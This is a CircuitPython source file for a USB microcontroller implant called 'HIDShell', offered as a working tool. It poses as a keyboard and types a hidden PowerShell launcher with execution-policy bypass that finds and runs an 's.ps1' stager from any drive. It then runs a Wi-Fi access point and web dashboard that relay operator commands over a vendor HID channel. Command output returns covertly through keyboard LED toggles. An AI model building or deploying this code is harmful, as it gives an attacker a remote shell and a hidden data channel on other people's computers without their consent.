import wifi
import socketpool
import usb_hid
import time
import binascii

# ─── Config ──────────────────────────────────────────────────────────────────

AP_SSID     = "HIDShell"
AP_PASSWORD = "h4ckth3pl4n3t"
AP_IP       = "192.168.4.1"
STAGE_DELAY = 1
KEYSTROKE_DELAY = 0.016
LED_TIMEOUT_S = 3.0

# ─── HID Keycodes ────────────────────────────────────────────────────────────

_KEYMAP = {}

def _init_keymap():
    for i in range(26):
        _KEYMAP[chr(ord('a') + i)] = (0x04 + i, False)
        _KEYMAP[chr(ord('A') + i)] = (0x04 + i, True)
    _KEYMAP['0'] = (0x27, False)
    for i in range(1, 10):
        _KEYMAP[chr(ord('0') + i)] = (0x1E + i - 1, False)
    syms = {
        ' ': (0x2C, False), '-': (0x2D, False), '=': (0x2E, False),
        '[': (0x2F, False), ']': (0x30, False), '\\': (0x31, False),
        ';': (0x33, False), "'": (0x34, False), '`': (0x35, False),
        ',': (0x36, False), '.': (0x37, False), '/': (0x38, False),
        '\t': (0x2B, False), '\n': (0x28, False),
        '!': (0x1E, True), '@': (0x1F, True), '#': (0x20, True),
        '$': (0x21, True), '%': (0x22, True), '^': (0x23, True),
        '&': (0x24, True), '*': (0x25, True), '(': (0x26, True),
        ')': (0x27, True), '_': (0x2D, True), '+': (0x2E, True),
        '{': (0x2F, True), '}': (0x30, True), '|': (0x31, True),
        ':': (0x33, True), '"': (0x34, True), '~': (0x35, True),
        '<': (0x36, True), '>': (0x37, True), '?': (0x38, True),
    }
    _KEYMAP.update(syms)

_init_keymap()

# ─── Device Discovery ────────────────────────────────────────────────────────

keyboard_dev = None
command_dev = None

for dev in usb_hid.devices:
    if dev.usage_page == 0x01 and dev.usage == 0x06:
        keyboard_dev = dev
    elif dev.usage_page == 0xFF and dev.usage == 0x01:
        command_dev = dev

# ─── Keystroke Injection ─────────────────────────────────────────────────────

def _release():
    if keyboard_dev:
        keyboard_dev.send_report(bytearray(8))
        time.sleep(0.005)

def _press(keycode, shift=False, gui=False):
    if not keyboard_dev:
        return
    mod = 0
    if shift:
        mod |= 0x02
    if gui:
        mod |= 0x08
    report = bytearray(8)
    report[0] = mod
    report[2] = keycode
    keyboard_dev.send_report(report)
    time.sleep(KEYSTROKE_DELAY)
    _release()

def type_string(text):
    for ch in text:
        if ch in _KEYMAP:
            keycode, shift = _KEYMAP[ch]
            _press(keycode, shift=shift)
        time.sleep(0.002)

def press_enter():
    _press(0x28)
    time.sleep(0.08)

def press_gui_r():
    _press(0x15, gui=True)
    time.sleep(0.5)

# ─── Deploy Stager ───────────────────────────────────────────────────────────

def deploy():
    time.sleep(STAGE_DELAY)
    press_gui_r()
    time.sleep(0.5)
    launcher = "powershell -w h -Ep Bypass -c \"gdr -P FileSystem|%{$f=$_.Root+'s.ps1';if(Test-Path $f){iex(gc $f -Raw);break}}\""
    type_string(launcher)
    time.sleep(0.1)
    press_enter()

# ─── Vendor HID Command Sender ───────────────────────────────────────────────

def send_command(cmd_text):
    """Send command via vendor HID using Diabolic Shell framing."""
    if not command_dev:
        return False

    framed = "<<START:" + str(len(cmd_text)) + ">>" + cmd_text + "<<END>>"
    data = framed.encode("utf-8")
    chunk_size = 63
    offset = 0

    while offset < len(data):
        remaining = len(data) - offset
        this_chunk = min(remaining, chunk_size)
        report = bytearray(63)
        for i in range(this_chunk):
            report[i] = data[offset + i]
        command_dev.send_report(bytes(report))
        offset += this_chunk
        time.sleep(0.005)

    return True

# ─── LED Response Reader (Keyboard) ──────────────────────────────────────────
# Stager encodes output via keybd_event LED toggles:
#   NumLock toggle = bit 1, CapsLock toggle = bit 0
#   ScrollLock toggle = byte commit
# After LED_TIMEOUT_S with no activity, buffer is flushed as response.

LED_NUM  = 0x01
LED_CAPS = 0x02
LED_SCRL = 0x04

class LEDReader:
    def __init__(self, kb_dev):
        self.kb = kb_dev
        self.last_leds = 0
        self.current_byte = 0
        self.bit_count = 0
        self.buffer = bytearray()
        self.receiving = False
        self.last_change = 0.0
        self.response_queue = []  # completed responses

    def reset(self):
        self.current_byte = 0
        self.bit_count = 0
        self.buffer = bytearray()
        self.receiving = False

    def _finish(self):
        """Complete current buffer and add to queue."""
        if len(self.buffer) > 0:
            try:
                text = bytes(self.buffer).decode("utf-8", "replace")
            except Exception:
                text = repr(bytes(self.buffer))
            self.response_queue.append(text)
        self.reset()

    def get_response(self):
        """Pop a completed response from the queue, or None."""
        if self.response_queue:
            return self.response_queue.pop(0)
        return None

    def poll(self):
        """Process LED changes. Call this frequently. Does not return data —
        use get_response() to retrieve completed responses."""
        if not self.kb:
            return

        report = self.kb.get_last_received_report()
        if report is None:
            if self.receiving and len(self.buffer) > 0:
                if time.monotonic() - self.last_change > LED_TIMEOUT_S:
                    self._finish()
            return

        current_leds = report[0]
        if current_leds == self.last_leds:
            if self.receiving and len(self.buffer) > 0:
                if time.monotonic() - self.last_change > LED_TIMEOUT_S:
                    self._finish()
            return

        changed = current_leds ^ self.last_leds
        self.last_leds = current_leds
        self.last_change = time.monotonic()
        self.receiving = True

        if changed & LED_SCRL:
            self.buffer.append(self.current_byte & 0xFF)
            self.current_byte = 0
            self.bit_count = 0
        elif changed & LED_NUM:
            self.current_byte = ((self.current_byte << 1) | 1) & 0xFF
            self.bit_count += 1
        elif changed & LED_CAPS:
            self.current_byte = ((self.current_byte << 1) | 0) & 0xFF
            self.bit_count += 1

# ─── WiFi + HTTP ─────────────────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIDShell</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;height:100vh;display:flex;flex-direction:column}
#hdr{padding:12px 16px;border-bottom:1px solid #1a1a1a;font-size:13px;opacity:0.6}
#out{flex:1;overflow-y:auto;padding:16px;font-size:14px;line-height:1.6;white-space:pre-wrap;word-break:break-all}
#bar{padding:12px 16px;border-top:1px solid #1a1a1a;display:flex;gap:8px}
#cmd{flex:1;background:#111;border:1px solid #333;color:#00ff41;font-family:inherit;font-size:14px;padding:8px 12px;outline:none;border-radius:4px}
#cmd:focus{border-color:#00ff41}
#btn{background:#00ff41;color:#0a0a0a;border:none;padding:8px 16px;font-family:inherit;font-weight:bold;cursor:pointer;border-radius:4px;font-size:13px}
.cmd-line{color:#00bfff}.err{color:#ff4444}.sys{color:#666}
</style>
</head>
<body>
<div id="hdr">HIDShell // Vendor HID + LED</div>
<div id="out" onclick="document.getElementById('cmd').focus()"></div>
<div id="bar">
<input id="cmd" placeholder="Enter command..." autofocus autocomplete="off" spellcheck="false">
<button id="btn" onclick="send()">RUN</button>
</div>
<script>
const out=document.getElementById('out'),cmd=document.getElementById('cmd');
let polling=false;
function log(t,c){const d=document.createElement('div');d.className=c||'';d.textContent=t;out.appendChild(d);out.scrollTop=out.scrollHeight}
function send(){const c=cmd.value.trim();if(!c)return;cmd.value='';log('> '+c,'cmd-line');
fetch('/cmd',{method:'POST',body:c}).then(r=>r.text()).then(t=>{
if(t==='OK'){startPoll()}else{log('[!] '+t,'err')}}).catch(e=>log('[!] '+e,'err'))}
function startPoll(){if(polling)return;polling=true;log('[*] waiting...','sys');doPoll()}
function doPoll(){fetch('/poll').then(r=>r.text()).then(t=>{
if(t==='WAITING'){setTimeout(doPoll,500)}
else if(t==='TIMEOUT'){log('[!] response timeout','err');polling=false}
else{log(t);polling=false}}).catch(e=>{log('[!] '+e,'err');polling=false})}
cmd.addEventListener('keydown',e=>{if(e.key==='Enter')send()});
log('[*] connected to HIDShell','sys');
</script>
</body>
</html>"""

def handle_request(conn, reader):
    try:
        buf = bytearray(4096)
        n = conn.recv_into(buf)
        if n == 0:
            conn.close()
            return

        request = buf[:n].decode("utf-8", "replace")
        first_line = request.split("\r\n")[0]
        parts = first_line.split(" ")
        method = parts[0]
        path = parts[1] if len(parts) > 1 else "/"

        if path == "/" and method == "GET":
            body = DASHBOARD_HTML.encode("utf-8")
            resp = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                b"Connection: close\r\n\r\n" + body
            )
            conn.send(resp)

        elif path == "/cmd" and method == "POST":
            body_start = request.find("\r\n\r\n")
            cmd_text = request[body_start + 4:] if body_start >= 0 else ""
            cmd_text = cmd_text.strip()
            if cmd_text and send_command(cmd_text):
                _send_http(conn, "200 OK", "OK")
            else:
                _send_http(conn, "500 Error", "FAIL")

        elif path == "/poll" and method == "GET":
            response = reader.get_response()
            if response is not None:
                _send_http(conn, "200 OK", response)
            else:
                _send_http(conn, "200 OK", "WAITING")

        else:
            _send_http(conn, "404 Not Found", "Not Found")

    except Exception as e:
        try:
            _send_http(conn, "500 Error", str(e))
        except Exception:
            pass
    finally:
        try:
            conn.close()
        except Exception:
            pass

def _send_http(conn, status, body_text):
    body = body_text.encode("utf-8")
    resp = (
        b"HTTP/1.1 " + status.encode() + b"\r\n"
        b"Content-Type: text/plain\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n" + body
    )
    conn.send(resp)

# ─── Main ────────────────────────────────────────────────────────────────────

print("HIDShell starting...")
print("  Keyboard: " + ("OK" if keyboard_dev else "MISSING"))
print("  Vendor HID: " + ("OK" if command_dev else "MISSING"))

wifi.radio.start_ap(AP_SSID, AP_PASSWORD)
pool = socketpool.SocketPool(wifi.radio)
print("  WiFi AP: " + AP_SSID)

deploy()
print("  Stager deployed")

reader = LEDReader(keyboard_dev)

server = pool.socket(pool.AF_INET, pool.SOCK_STREAM)
server.setsockopt(pool.SOL_SOCKET, pool.SO_REUSEADDR, 1)
server.bind((AP_IP, 80))
server.listen(2)
server.settimeout(0.1)

print("  Dashboard: http://" + AP_IP)
print("  Ready.")

while True:
    try:
        conn, addr = server.accept()
        handle_request(conn, reader)
    except OSError:
        pass

    reader.poll()
    time.sleep(0.001)
